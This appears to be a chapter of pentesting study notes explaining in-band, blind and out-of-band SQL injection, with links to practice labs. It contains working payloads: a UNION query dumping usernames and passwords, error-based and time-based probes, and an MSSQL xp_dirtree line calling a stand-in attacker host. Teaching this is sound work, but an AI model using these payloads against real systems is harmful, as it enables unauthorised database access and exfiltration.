# Chapter 02 — Types of SQL Injection

## About the Topic
SQLi is grouped into three broad families based on **how you receive
feedback from the database**. Knowing which family applies tells you which
technique/payload set to reach for.

### 1. In-Band SQLi (classic)
The attacker uses the same channel to launch the attack and retrieve
results. Two sub-types:
- **Error-Based** — the app leaks DB errors directly into the response;
  fastest way to enumerate data.
- **UNION-Based** — attacker appends a `UNION SELECT` to pull extra columns
  of data into the visible output.

### 2. Blind SQLi
No data is returned in the response — you infer answers indirectly.
- **Boolean-Based** — page behaves differently (content changes) for
  TRUE vs FALSE conditions.
- **Time-Based** — page response is delayed (e.g., `SLEEP(5)`) when a
  condition is TRUE; used when there's zero visible difference otherwise.

### 3. Out-of-Band (OOB) SQLi
Data is exfiltrated via a completely different channel — typically DNS or
HTTP requests triggered by the database itself (e.g., MSSQL `xp_dirtree`,
Oracle `UTL_HTTP`). Used when in-band and blind techniques are too slow or
blocked.

## Why It Matters Offensively
Real targets rarely hand you clean error messages. A pentester needs the
full toolkit — if UNION-based fails, you drop to boolean-blind; if that's
too noisy/slow, you escalate to time-based or OOB via Burp Collaborator /
DNS canary tools.

## Practical Example — Same Bug, Different Techniques
Given the injectable parameter `?id=1`:

```sql
-- UNION-based (in-band)
?id=-1 UNION SELECT username, password FROM users--

-- Error-based (in-band)
?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))

-- Boolean-blind
?id=1 AND 1=1   -- normal page
?id=1 AND 1=2   -- different/empty page

-- Time-blind
?id=1 AND SLEEP(5)   -- response delayed 5s if injectable

-- Out-of-band (MSSQL example)
?id=1; EXEC master..xp_dirtree '\\attacker.oob-domain.com\a'
```

## Labs to Practice
- **PortSwigger Academy** — "SQL injection" topic page lists labs by type:
  UNION attacks, Examining the database, Blind SQL injection.
- **TryHackMe** — *SQL Injection* room (covers UNION + error-based).
- **TryHackMe** — *SQLMap: The Basics* room (blind + time-based via
  automation).
- **HackTheBox Academy** — "SQL Injection Fundamentals" module.

## Key Takeaway
Diagnose which type you're dealing with **first** (visible output? errors?
timing only?) — it determines your entire payload strategy.
